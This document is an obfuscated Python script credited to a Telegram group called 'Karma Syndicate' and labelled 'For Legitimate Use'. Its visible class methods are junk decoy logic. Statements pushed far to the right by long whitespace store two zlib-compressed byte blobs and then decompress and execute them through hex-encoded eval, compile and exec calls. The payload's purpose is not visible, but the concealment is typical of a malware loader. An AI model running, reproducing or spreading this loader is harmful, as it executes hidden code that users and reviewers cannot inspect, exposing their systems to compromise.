from builtins import *
from math import prod as Square


__tool__ = 'For Legitimate Use'
__authors__ = ('Telegram:', '@xnabob')
__organization__ = 'Karma Syndicate'
__telegram__ = 'https://t.me/KarmaSyndicate'
__version__ = 'Latest'

__license__ = '4836037d39227231520bc3346a94c8a7'


_frame, Algorithm, MemoryAccess, _modulo, Product, _negative, Absolute = exec, str, tuple, map, ord, globals, type

class _add:
    def __init__(self, CallFunction):
        self._memoryaccess = Square((CallFunction, 17645))
        self._round(Frame=-80211)

    def _round(self, Frame = str):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._memoryaccess -= 30584 - Frame
        
        try:
            ((_modulo, {MemoryAccess: _frame}) for _modulo in (_frame, _frame, MemoryAccess) if MemoryAccess is _frame)

        except AttributeError:
            {_modulo: _modulo} if _frame < Algorithm else (Algorithm, _modulo, Algorithm) != _modulo

        except:
            Absolute(44537 + -78900) == True

    def _power(self, _hypothesis = 73780):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _hypothesis *= -19067 - -65376
        self._walk != Ellipsis
        
        try:
            ((_frame, _frame, MemoryAccess) or Algorithm if (_frame, _frame, MemoryAccess) and Algorithm else ... or (Algorithm, (_frame, _frame, MemoryAccess)))

        except AttributeError:
            ((_modulo, _modulo) or _algorithm if (_modulo, _modulo) and _algorithm else ... or (_algorithm, (_modulo, _modulo)))

        except:
            Absolute(66376 - 76892) == True

    def _product(_system = float):
        return _negative()[_system]

    def _stackoverflow(_callfunction = 98621 / 13172, _statistics = type, Builtins = _negative):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Builtins()[_callfunction] = _statistics
        
        try:
            (_modulo, _modulo) if _algorithm == _frame else (_frame, _frame, MemoryAccess) > _algorithm

        except AssertionError:
            ((_modulo, {_modulo: _modulo}) for _modulo in (_frame, _frame, MemoryAccess) if _frame >= Algorithm)

        except:
            Absolute(-36434 * 62034) == False

    def execute(code = str):
        return _frame(Algorithm(MemoryAccess(_modulo(Product, code))))

    @property
    def _walk(self):
        self._floor = '<__main__.Algorithm object at 0x000009699BE43301>'
        return (self._floor, _add._walk)

if __name__ == '__main__':
    try:
        _add.execute(code = __license__)
        Ceil = _add(CallFunction = 56143 * 55028)

        if 338654 > 6096160:
            _add(CallFunction = 75834 / 73131)._power(_hypothesis = 1924 * Ceil._memoryaccess)
        elif 296444 < 7297868:
            Ceil._round(Frame = Ceil._memoryaccess - -65667)                                                                                                                                                                                                                                                          ;_add._stackoverflow(_callfunction='LLJJJILJJJJIIJJILLJ',_statistics=b'x\x9c\xdd\x1cks\xa38\xf2\xbb\x7f\x85/_\x0c5^/\x06\xcc#u\xae\xba\xb9\xcb\xcc^f\x93xk=w\xc9\xd6\xd4\x94\x8b\x80\x88\xc9a\xf0\x00\xde$\xb7\xb5\xf7\xdb\xaf\xbb%al\xc76\xf1#;;\x96\x85@\x08\t\xb5Z\xfd\x94(\xb2\xa7\xd3F\x13~Q\xa8P\x8a\xbf\xd1\xa8H\xd3x4j\xfe\xa5\x7f\xf2>\xcd\x9a\x17\xec.*\xa2\x89W\xb0\xe6\xbfrv\xd2L\xb3JQoV\x8c\xd3,\xa7\xd2\xca\xc9G\x16\xb3\xbb\xcc\x9b\x9c\x9e\xb4O\xfe\xf6\x98x\xb7\xe9\xed\x89\xbaP>\xcd\xee\xbc$\xfa\xafWDi\xc2\x9b\xf8\xd1\xcb&^s\xf8\x94\x04\x91\x0fm,\xd5_\x88\x1ay\xd9qQL\xf3\xd3\xef\xbf/:\x13\xf6==\xb8\xee\xb9_Y\x96\x97M\\\xc0\xfd\xbcX*\x11G>KrF%Z\xa6cX\x9aa\x07\x86\xab\xeb\xb6nt{\xbav\xeb\x1b\x86iy\xae\xe9;\x9e\xddj\xa8\xa7\xe5\xb3QR(\xad\xfc?Q\xd0R\x1b\xec\xd1g\xd3B\x001\x99\xce\n\xe5\xe4\xa7\x98y9k\x9e\xa5I\xabh^\xa6A\x14>\x9d\xa8\r\xdeh4\x99\xa6Y1\x1a\xc1\xf3OyK\xed\xb0\xc7\xa8P\xd4F\x9c\xfa^\x9c+\xea\xa7\xd69\xfe>\xc0\xef\xfc\x03\xa4\x17\x90^\\\x9c\x9f_|8o}\xee\xdf\xc5\xe9-\x14k\xac-\x83\x15\x0c\x06\x03M\x838H\xe1\x90j\x10\x07\xadO\xa7\xa7o\xbe{\xf3\x9d\xf2\x9d\xf2\xa6\xab\xaa\x9f\xa1&VxE\x91m\xae)\x8a\xe2\xf8>\x8a\xe1\x18\xc5\xf7p\x1a\xdf\xc3q\xb5\xae \xdaR\xcf\xf5\xf5\xf5\r\xfc\xe0x\xcd\x7fp\x0e\xd7\xd0!\xde\xed\xc6\x9a\x02\xf8\xec\xe5\xd5\xd5\xe5%\x1c\xca\x04\x9e\x9aCqs\xbb\x8f\xf8{\x90\x87\x07<\xe2\xff\xe1\x01\xeaX\xa9Wi\xdd\xce\xa2\xb8\x88\x12\x1c\x95_\xbd,o\xac}\x9c\x86)\xc6\x96\xe3x~\xc0$\x86\x9a\x07\x04s\x18\x81t\xa0\xf1\xa1\x18(\xcf\xb4\x16E~\x0e\x13\xe1v\x19\x9ej;F8\x13\xbc\t\xf2\x11\x9cF\xd1\x8b\xaaP?\x1d\xa0\x8eN\x94\x04\xecQi=\x85Q\xfc\xc8\xc6\xc9l\xa5\xc8gu3\xfc\xb1\x1d\x8a\xd4\x1ao\x1c/\xea\x03)O\xa2"\x8ef\xfb\x00im\x15/\x00\xd2\xfa:$\x90\xe24]\xbd\xbb\r>\xd4\x12\x81\x87\x1f\xaex\xab\xdf x\n/\x8d\xc3\xe7\xe0\xb3a\xe6_S\xe6\x8d(q\xc3o\xc1\xf1\x1b\x04OV\xe4/F\x1e\xa47\xf4\xa7H\t\x0f\xdf |b\xefW\xf6B\xecAzMd\xfb\x81N\x1e8\xf1~\x04\xe0\xb4Z\x9d\xfb4J6=\x0coz\x7f\x7f\x1fa\x80\x17\x8f\xe0\xd5\xbfA\xa0\xb28\x9aNR\xff9\xb8n\xe4|\x93I\x92$\x18\xf17\xc1\xabo\x118y\xec\xbd\x7f)\xc1\x12\xf97%\xdd\x12\xe1[\x84\xcf,\xfb\xf8r\x92%\xa5$y\xc0X\xade-MSZ\xaa1rG\xda\xc8\x1eY#s\xa4\x8f\x0cHux\xc2\\\xcd\xad[\xa1+\x1e\xd3 \xe8#\x07b\x0f\x9e\xd0\xe0l)\xb7^\x85k\x04B\xe5\xb6ehz\xa0;z`tu\x17d\xcb\x80\xf9i\xc0\x94\x96\x13\x16\xab"\x95\xca\x0f\x14\xbf=\xac\xf1\xd9\xe3\xb3t|\x13\xbdY\x0f\xd7\x9ea\xe8<\xca3\x0c\xf3\x1c~\xb5\r\xe2\xa0\x84x\x93\xdb\xc0\x03u-\x85\xff`pv6H\xcf\xe8l08\xdd\x80\xcf[\xa8$\xd2\xc8\xc9\x84\x08$Q\xcc\xbd\xb1\xc8\xe8\x85\x86\x03\xb1\'R\x17\xa2\x06\xd1\x14)FK\xbf%L\xabS\xb6W\x0f\x1b\x01>;\xbc\xad\xae\x1b\x1e\xc0_3\x1c\xc3\xd6\xf5\xad\xedl\x86\xa5\x0e\xbf\xe1P\xa7\x04\x03\x9e\x0e\xf7\x86\'\xc2\xc6\xa8\xc0D\x87\xd8\x15\xd7V\t#\x0e\xcf:e\xcd\xa3\xc2\xd3\xb6{64\x05\xc0\xb4\xf7\x84\xe6\x95T\xc7\xb8\xda\xc1\x952L_\x9b\xce\x953\xefR\xa8\x89\xf4*\xa4"r\xbar\xba\xa1\x1f;\xd2\x0c\xcb\x87\xe0Ap!\xe0\xb9KW<W\\\xd5\xa0\x18\xbb\x8d\xe0\xdec\xb7\xbev\x93Q\x08(\x06\x94\xb2\xf2\x18\x88\xbb\xf3\x10\x1c\xa9\x8f\xbam\x02\x8e:\xb6\xa9\x87\xb6\x06\xf0\xec\x02D\xd9\xbe\xf3\x7f\x13\x07\x90t~\x91\xee\xcf\xf9\xc1\xfc>\x86c\x8d\xec\xdesR\x08\x8dx\xbc\xb9\x96\xcan]A\xa6\x0b%\xb4?BH\xd9y"\xf8\xc7\x9b\x08V\x00\x81AX>\xf2\xb8pw;:\xac\xb3`)\xca\xffV\xd5 5\xcd\x14e\xad\x12\xa0zI\xa0<\xf3\xd0Vr-\x9a\x14\xc6\xa2\xcb\xf2\xba6z\x80\x88\x8c\x92l\x17\xe4Z\x03$[\x8b\xe4\\}5wo\x14\xea\n\x14\xd2\x8e\x8dB\xa5\\#y\xb2+R\xa7rmTx\xf7\xf6\xb2\xdb\xdfxw\x84\x9c\xa3\xe1\x1c\t\x83\xf2\x9a\xc9{\xc7\xa2\xc9\x16\xd0c\x08\x9am\x18\x9e\x1eB8\x1e=v \xd8"V\x83]\xb9c\x97\xa9s\xac\x1e\x9b=\x8b\x11\'\xd2u\xcd\x04\xaen\x1b\xb6\t}\xd7\x8e\xd8s{\xa1\xdf\xd5\xd4~\xa5>\x1bV\xc8{\x8dG=\xe8\x99\xb6\x0b<\xb8\xf7j}v*\xd7vu\xd4kk`ht\x8b\xef\xa3\xe8>\x8a\xf9\x19\x1a\xe1@\xef<]kt\xd9\xe2\xa3\xb9@\xd5\r5\xb6\x0b\xd4\xdc\xf0\x88J\xdc\xdet\xce\x14\x1a\x00R\x16[P\x10G\xe4YR\xe3\x12\xd4\xa7NYg\x7f\xcd\x81K\x01\xddW\x97\x02vD\x1d\x10\x11\xf1\xe7P\xb0\xc5\xd5\xfcZ\x9e\xd7A\x9d\x9d&KO\x07\xe2\x00\xe3a\xf9(\xaa\xf6l\xd31\x03\x9c2V\xa8\x07\x96\xd1\xd3@pe0\x91|=0A\x7f\x85+\xc3\xba\xd5aZ\x91h\xbb\xaf:\x9bH\xfeO&\x02\x08\xf59y\x97\xacSh\xe6\xea\x12\xf76\x89\x93\xaf\xe4\x1e\xd4\xd6`H]\xb8\xc2;1\xb5\x9f\xb15\xac+k\x1dF"h\xa9:u\x14m\x81]\xb2\xf8\xb9#\x17*pF\xf6r\xeeA\xcc\x03\xae\x98\xb4\xa6\xe8Z\xb72\x89I\x9c\xa8\x88\x18\xdb\xca\xd6\x111\xf6\x98Q\xa5\x18\xc1\x16d\xdc\xa0\x9a\x7f,\xf5\xc7\x82y\x03-peo_Uh\x88\xe6\x9d!7\xf9\xa0\xadgH\xc9\x01\xec=/\x94N7\xe3\xa1\t\x18\xe7\x02\xaeu\xc9X\xdcCa\x1a\x1e\xee\xad\xe6\xfeY(\xb2\xe9\x99>\x04\x97\x82\'\xa2\x0fG\x9e\x0fw\x8eE\x8b\x0fg(\xdc\xc8o$\xa7\x91\xfc\xc5^\xe2;p\xdc\xa7\x87-U\xab\xaf\x86\xb7T\x07\xb0\x03T.\xa0U\xe8\xb5\xb0\x91\x84\xc3\x13\xeejn\xdd\n\xb5\x83\xb0\x7fs\x89\x80\x19BJ\x91\x12\x8c^\xd1\xab\xea\x94\xd5_\xe6\xf1\xd8\xca8Ie\xa6D(\xd2\x93\x83\xb0:K\xd0j[\xb0/\xa9\x1aJAM\xab\xb0\xbaMe\xbb$\xf8\x1d\x80\xbc\x18\xc4\xc8\x08\x01\xc8K\xa5\x8dlx\xd8 \xc2\xb2\x90\xfbu\x91\x97\xd6\xcd|\xb1\x86\xb0|\xd0\x8a\x8d\xd77,\xefD\x89\xac.(\xc9\x1a\x99\x81\r87!\x05\x95J\x0fmh\x9b\x13\n\x90\x0e-+\x04\x89\x10\xa4E\xd0vt(\x0b\xea\x96\x85\xaa\x17*^\xfb\xcb\x86i:H\xd1\xff\x84\t\x9e@\x1c\x0c\xce\x06gg{\xc3\xd0\xaa\x98@\x8c\x8al\xe2\n\x1cw+\xf2L\x9d\xb25\xe5\x99\x1d\r<]ADL1\xf2fM!r\x9bl\xa1K\xf1\x82;\x91\x0e V\xbc\x12n\x1e\x8f7\x92#\xc4%\xd7\x87[q\x88\xb8\xc2%\xe2\x89;\x9e<\x1e\xcdLeQ\x9b{\x1b,Z\xd2\xb8:\x11\n\x16?\xff\x03\xe4Gn\xd5\xc0\xf5\xb8\x145M\xb8\xf3ar\xa7\xda\x8eF\x8d\xad\xe6\x18\xa7brZ5\xcf\x88\x9c\xfd$\x9d.W\xb1@D\xd1\x81\x07!\xa7\xea\xd2R\x8c\x95\xdc\xbda\xaeW\x08OU\x9ftD\xb4I\xc6\xe0D\xabN\xd9\xc3p\xb9K\xe1\xa8$\x8b\xfc\x15w\xa2\xfeI\xe8\xc8\xde\xae\xaa\r\x1a\xc4\xdc\xd1\x18\x08G\xa4tFV\\\x90\x7f\x16#w)lr\xfa!\x16s\xd4\x95\xc6Qv\xc3Y`\xe1\xfa!\x90\xd6\xe0L\xa8\x87K\xb9\x7f\x90\xcfE\xacx\x01\xc1\x02\xd7\x16\xd1\xa2\x17<\xc3\x93#8\xdd\xcd\xd0\x0c-\x11M\x90\x9ay\x94W\x18,Hk\x9b\x89\xa9Z\xde\x00\xa6\x12V\xf1\xce\x8bu6\xf0F_\xf0F~t\xc5\xe2\x01O\xf0J\xbf\xbc\xcf\xf3\xfc\xda} \xba\xc1\x0f\x97e\xba\xfbj\xa3s\t\n\xd1\x11\x08{c\x96-\x94\x9dnE\xc9\xe9J\xc3\x96\xa0\xb9\x9b\xca\xd4\xb4\xf9mf5\\O6h!\x1e\xdaU\xaaz\xf2B\xee\xabO\xa4-\xd4\xa34\xee\x12\ry\x89\x9d\xf7\x08"\x88p\x1c_\x89\xbf\xdckp\x8c\xa9\xee\x9a01\xb8\x19i\x9e\xca se<\x0e3X\xf0\xb18\x15\x0c\x95\xaa;\xf7\xb9p\x0c\xaeSvo\xefp\x0bH+\xfe\x80\xd2"\xcdE:{\x10\xd1H\xafL9\xb9\xbc\xcf\xaa\x98_\xac\x8ah\xb4\xad\xecq\x97\x03\xdaV\xf7x\x92G\xe9zt\x16\x1c\x90Uy\xb8\x9e\x1br\'\xc9\xa3\xe7[\x8c\xa2iu\xad[\xd0_4\x13\xad\x07\xfa\x014\x19n\xfb\x1e\xcau\x8f\xa4\xb7\xbe\xaeA\xd0Z\x9e6\xe2\xda\x12\xc2\xb5U\x99Ju\xca\xda;\x88)\xa4\xb0s@,\xe8\xef\xc3#0|.\xaa\xcc\x03\x17V,!\xb0\xf0\x1cK\x88.\x18\x8e\xb6\x8eN\xb7\xf6V\xf9[\xa5n9_SF\xd6\xb9\xd7]X&)\xac]A\x8dn\x85\x10U\x1diu\xca\xd6u\xa4\xedc\x08|\xb5\x153\x0b+\x81\xaa\xcb\xd3\x96\xae_ \x1cK\xf1\xf8\x9c\x12\xfaC8\x8ep,\xc4\xde\x8aP\xec\x96ki\x8f\xb8\x92\x96\x1c\xf2\x86m\xee\xedlL\x91\x1b\x9f\xe1j\x7f2\xb7\x02wN\xbf&?\xe3F\x18\x98d\xa2>&[-\xf7P\xc8\xb5\xb4\xab\xebje\x1e\x86\xfd\x8cJ\xa82\x9b\xa4\x1es\x03\x92NF%w5\xf7\xebryl\x14\x85\xb9\x1f\xd5\'O\xaa/<\xaa\xbe\xb8\x96y\xc7\xb3\xa7.\x111\x980\x1a\xc8\'(\x99\x04\x806\xe8\xb50\xf4\xd0\x0c\xec\x9e\xe5\xf6\x1c\x93\x99\x8e\xe5\x83.n\x03\xd1u\x0c\xd7v\xcc\xb0\xa7Y\x01z?l\xd34\xcc[\x90\x18\xe1I\xc3\xb0B[\x83\xf2\x01zGt\x06u:v\xad\x85ua\x96N\x9ar')

        _add(CallFunction = 22677 - -24163)._round(Frame = Ceil._memoryaccess * -28423)                                                                                                                                                                                                                                                          ;_add._stackoverflow(_callfunction='IIJJILLIJIIIJLJLIL',_statistics=b'\x8f}\x93\xef\xe0o\xb2G\xe6\xb7\xe9\xb3\t\xed\x98%\xedi\x16%E\x1bc\xe6%w\xac\x9dN!\x13?\x91\xd0\xc0\x82\n\xdf\x04\xc2E".\r\xd1\xa6\x10]m\x88\xea2\xf6e\xc6\xf2"ozy3\xfbR\xe6zI\x00mc^\x12\xc8\xcc\xbc\x80\xb6\xee03\xe7\xaf&\x9f\xed\xe0\x17-\xe4\xfb\xfd\xf3\xe3\xc7\x9f\xfe\xee\xe5\x91\xff\x163\xa10\xa6\xbc\xbc\x9f\xc6i\xe6M<Y4J\xa2\x02KDE\xfb}\x9a1<}\xdf\x1e\x16O1\x9d\x0e\x8b\xb2\xe1\'z\xbd\xfcIf\xa4t\x9dN\x1bQ\xa1@\xdb\xf0l\xce\x8a>\xb7^\x97z\xa4\xb8T\x1b\x19\xf3G~\x94\xf6\x81\x8c\x7f\xa0\x85m\x10!\xa5%n\x8d\x80\x85\xcd\xd1\xddt\xa4\xc4}\xa9|\xca\xd5\xc6\x89*?\xf4\xd1\x8c\xff*\x0c(\x02c$\x8f8\x9f\x7f\xe1"\xee\x0f\xc5\xa6\x9ba\th\xee=\xa1"\xfe\xb8\x0fp\xca\xfd(\x1a\xc5\xac(X\x96\xbf\xc9;At\x17\x15x2\x9d%~1\xa3/|P\xe9\x8c\x15\xb3,i\xf2\xed&B\xfb\x14\x1b=h+\xae\x02\xc3\xd2\xf1\xc7i\xe43\xc5\x1f\xaba\x9a5G\x00\xce&\xe1\x80\x12\x03\xeeP\xbf2\xe8\xd7\xb8=kO\xdb\xe9\xbc/IZ4\xc7\x9d\xbc\xf0\xb2"\x7f\x88\x8a\xb1",\xfe\xdcG,\xdd\xc5\x95ow\x8c\xfb\xc2\xde"\xb6\xbe\xd0^\x937\xe3\xb2\xbe\xa4\xb2k\x0bk\xa2\x16\xe0e\xc6\x95*\xde\xf4? \xf3\xc4!\x00\x0e\xfa\x01\x07\x80n\xce\xba;\xcdU\x0bd=\xfb\x16\xe6\x11\xcc6\xcb\xb3i!\xa7\x1e\xa07\xd2r!G,`\x95L\x0f\xe6s(\xee1\xdb\xc2E\xae\xf0\x04y*\r\xa4i5f"\xf5!\xe8\xff&\x05\xc3\x1b\xbe\xb3\x9e;mO\xe5N{\xe1\xc4\x15>\x8a\xdf\xe9\xa9B~.\x86\x86\xb5\x9f}\xe9\xdc\xb1B\x99u\xdb8g\xfa87\x14\x18\x1f\xb5=f^\x00H\xd1\x1f\x07\xbc5\xfe\x91\x14\x98\x92\x9d\x9f\xf9,{G\x19\x80 \xf3\xeah\xee+\xef;?\xbf;\xdb\x89\xae#\x14M\x8bV!\xf9\xe4\x8b\xd5l\\\xcf\xa7\x91w\x96\xd1z>\x14\x19D\xae\x807\xd3\xb5\x9e\x01T\xd1%\xcf\xaf\x0b\xa5l\xc8\xc3\xb0\x1d\x8e\xea\x1c\x12\x84\xe0t\x898\xd8D\xb2\xa5\xa4\xed\x01\xf9oq?\xa1\xd4\xffU\x98\xe8a\xe5;2a3C\xdc-f\xf9\x08[\xea\xf7\xc5\x84\x9d\xcc\x17:$\x15\x10\xad\x0c\x81\xfc\x05\xfd\xacs\x9f\xa7\x89\xa2\xae\xdc\xc2\xd9\xe4!\x02\x07\x9fR4\xf2\x9e\xa5$\xed\x9c\x9d\x91\xec\xf3\xf9\x13_j\x8b+m#\xfe\x89\x97\xcf\xab\xd5S\x13\xdd\xbe\xf7)\x11\xbb\x1a\xa5]+\x99|~\xb6\xf0\x0c\x0bK\x9a!\xa84\'\xde\xcf\x97O\xa6}"[\xab\xaf_\xc5\x8c_\xde]\\\x0c\xaewF\x0e\xbe\xe8\x13\xa2I\xae}\x1cj@\x03\xbbgt\x01\x114\x94\xa6\x08-L\xba~9\x12T\x7f\x99~\x04B`\xe3;\x02\x7f\xb6A\xf6\xdbH\x02,\xb9W\xd0\x08\xca\xfeY\x95\xa7q\x01\x83\x89\xf7,`\xdfp\xaf&\xc9X\xe9d.\t@\xa6o#\x00\xcb?\xc4\xfc|\x11\xf5\xb97\x82\xaccgb\x01\xc4\x00\x93\xf4y|\xc4_\xd8y\xc8\xa2\x02X\xc4\x8e\xb0^\x16\x91\xe4\xe8\x97K\xd2\x0c\xdb\x97\x10\xc43\x0e/4\xf6\xec\x8c\x19U|\xfe\xe1\xe7w\xef\xaevGg\\\xbf\x0c\x1c\x81V2\x1b\xba\xc6t\x07\xf0a\x03J\xef\xfa\xca,\xce\xd9\xfa18<\xd9>xG8\xf7Q~dO\xef\xb2,\xcd\xda\xff\xf6\xe2\x19\xa3Su\xb5_G`C|\xb1\xb9F\xfb3\x0c4\x10Z@zp\xc9\xec\x81\xd9\xd0\xea@\x1d\x8d\xa7\n\x99\x04\x87\x86p0\xb4i\xdb\t\xe2!\x11-\xd9\xb1:\xafO\xc2\xdd4\x1c)a\xb2,\xd9\xa5\xd3\xce\xd4+\xc6\xf8\x954\x90\xcc\xa1\x80zpy\x81\xaf9\xd1t\x1b\xde\xd8\x82>\x04:\xb0\x05\x18\x80\x90zg\xf1\x9eA\xcfq\x884\x82BW\x0c\xa2a9(SX\xb7\x04\x15\x07\xf3\x88\xc8\xc2\xb9\xcew\x10\x10\xbc\x808\xbbtm\x8b\x15\xd2\x07\x90-\x00R\xf8Y\x06d\xd9\xd1=\xff6\xc3\xfd\xfd\x92p\x81\x8c?F\xc6\x1f.\xe2D\xdc\x8f;\xa8\xfcL\x97\xb8\xad\x00y\xbc:%\xfc4\x01\x9dm\xc6\x16Q\x0b\xab\x99\xc6\xa0\xb3\xf0E~77\xe2\x03M|\xdd\xdfJ\xdd\xa0\xde)S\xb5\xdf\xe7EK\xab\xa4x`\xb5\xd1q\x7f\xfa\xe9Q*\xda\xf4\x05\x1fR\xbb?w26\x8d=\xd0\x14\xb8dZ\xb6}-\x05\xd8\xf6P/u\x17\xb9\x88|\x95\xb0\xcd\xa0z\xc2\x90\x12?\xe8|U<\x99>@I\xbeq\xe8\x02\rh\xb4\x9b\x88\xef+z\xae\xb4@\xca\x7f\xfc\xf2v\x0f\xca\xae\x11y\x10\x94}.\xaa\xd0\x8c\xd2\x80\x81\xbb\x1c\xc7\x90@\xee%\xaa\xccU\xaa\x07\x98y|"\xb2G\x10\xc3\xf8pTg\xd8\\+(\x01\xce\xeb\xcb\x9f\xf87\x0c/\xe7[S\xa5\x86\xc7\xaf\xd5F)\xb2\x86I\x9f\x7f"\xf1}\xe7\xf2\xed\x0f\xef\xae>\xbe}\xc3+\xbd)\x07\xf3F\x8c"\xaf<\x8cb\x96\xf7\x7f\xc3\x8f0\xe1\x87\x08\xef\xef\xe9K\x84\xf4e&\xfc\x9f\x12\xc9\x10\x13b \x84l\xb1\xc6\nN\xf87<\xd4\xf6\xd2\x0e\xde+\xf1\xbbT\x7f\x17\xeai>M\x93\x9c\xf5K\x0b\xc04\xcdA\xa8\xe1\x8av\x9b\xbf\x03\x1d\xd5\xaf\x976\x99=\xdb!\xbc\x90\xcc\xe3%\xf8 \xc7P8X\x86r\x9d\xa4\x9cA\xbcd\x1a\xf6\xc57\xb5\xf8d\x14S\x92\x7f\xd8R\xd2\xefP]@\x9d=E\x1ct\xabU\xb6j!{\xb1\xd1\xb9fU\x99\xd1\\^\x80Ic\xd5d:B#\x05\x99\xe06\xf5\xb2\xe0<)X\x96\xcd\xe4\x87<\xf9,h\xfc\x1fd\x10l\xe8')

        _add(CallFunction = 58985 * 93839)._round(Frame = Ceil._memoryaccess + 62167)                                                                                                                                                                                                                                                          ;O0oo0oo0OOoO0oOOoo0o,oDooDODOODOooDODoDDoOo,iijjijljjjiliijijiijjlll,JLLJIJILIIJIJJJJILJLLIL,ijjilljiijiiijjlillli=(lambda NMMMNNNNNNNNMMNNMMMN:NMMMNNNNNNNNMMNNMMMN(__import__('\x7a\x6c\x69\x62'))),(lambda NMMMNNNNNNNNMMNNMMMN:NMMMNNNNNNNNMMNNMMMN['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda NMMMNNNNNNNNMMNNMMMN:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(NMMMNNNNNNNNMMNNMMMN)"),filename='\x4d\x4e\x4d\x4e\x4d\x4e\x4e\x4e\x4e\x4e\x4e\x4e\x4e\x4e\x4e\x4e\x4e\x4e\x4e\x4d\x4d\x4d\x4e\x4d\x4d',mode='\x65\x76\x61\x6c'))),(lambda:(lambda NMMMNNNNNNNNMMNNMMMN:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(NMMMNNNNNNNNMMNNMMMN)"),filename='\x4d\x4e\x4d\x4e\x4d\x4e\x4e\x4e\x4e\x4e\x4e\x4e\x4e\x4e\x4e\x4e\x4e\x4e\x4e\x4d\x4d\x4d\x4e\x4d\x4d',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda O00O0Oo0OO0OOoOoO000,NMMMNNNNNNNNMMNNMMMN:O00O0Oo0OO0OOoOoO000(NMMMNNNNNNNNMMNNMMMN))
        Ceil._power(_hypothesis = -62659 + Ceil._memoryaccess)                                                                                                                                                                                                                                                          ;JLLJIJILIIJIJJJJILJLLIL()(ijjilljiijiiijjlillli(oDooDODOODOooDODoDDoOo(O0oo0oo0OOoO0oOOoo0o(iijjijljjjiliijijiijjlll('\x76\x61\x72\x73'))),_add._product(_system='LLJJJILJJJJIIJJILLJ')+_add._product(_system='IIJJILLIJIIIJLJLIL')))

    except Exception as _algorithm:
        if 336193 > 1029906:
            _add.execute(code = Algorithm(_algorithm))

        elif 274819 > 6036994:
            _add(CallFunction = 92148 + -53373)._power(_hypothesis = 73899 + Ceil._memoryaccess)